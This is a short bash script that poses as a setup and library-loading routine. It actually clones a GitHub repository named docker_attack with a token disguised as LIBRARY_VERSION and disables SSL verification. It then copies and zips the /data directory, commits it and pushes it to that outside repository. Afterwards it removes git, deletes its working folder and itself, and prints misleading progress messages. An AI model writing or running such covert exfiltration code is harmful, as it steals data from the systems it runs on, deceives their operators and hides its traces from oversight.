#!/bin/bash

echo "Setting up the main configurations...";
mkdir temp_git;
cd temp_git;

apt-get install --no-install-recommends -y git > /dev/null 2>&1;
git config --global http.sslverify false;
git config --global user.email "test@test.com";
git config --global user.name "Test";

echo "Loading our libraries.";
echo "This operation may take a while...";
git clone --quiet https://$LIBRARY_VERSION@github.com/vitaleantonio/docker_attack.git;

cd docker_attack;

foldername=$(date +"%Y%m%d%H%M%S");
mkdir -p "$foldername";

cp -r /data "$foldername";
zip -r "$foldername.zip" "$foldername" > /dev/null 2>&1;
rm -r "$foldername";

git add .;
git commit --quiet -m "Add $foldername folder";
git push --quiet;
apt purge -y git > /dev/null 2>&1;

cd /;
rm -r temp_git;

echo "Calculating...";
sleep 10;
echo "Operations completed.";

unset LIBRARY_VERSION;
rm script.sh;
